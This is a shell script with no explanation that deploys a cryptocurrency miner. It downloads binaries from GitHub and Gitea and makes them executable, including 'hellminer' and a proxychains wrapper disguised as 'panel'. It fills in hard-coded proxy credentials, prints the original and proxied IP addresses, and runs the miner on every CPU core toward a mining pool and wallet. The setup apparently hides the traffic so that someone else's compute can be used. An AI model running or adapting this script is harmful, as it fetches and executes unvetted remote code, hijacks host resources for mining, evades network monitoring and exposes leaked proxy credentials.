proxy="38.154.227.167" 
port="5868" 
user="ugursfso"  
pass="wqn60pnk6m95" 
wget https://github.com/traapoks/traapoks/blob/main/hellminer && chmod +x hellminer
wget https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
wget https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
wget https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf" 
sleep 11 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
./panel ./hellminer -c stratum+tcp://eu.luckpool.net:3956 -u RRYVVDXrrwgchzytdZk4AAZuNm21348cF9.1 -p x --cpu $(nproc)

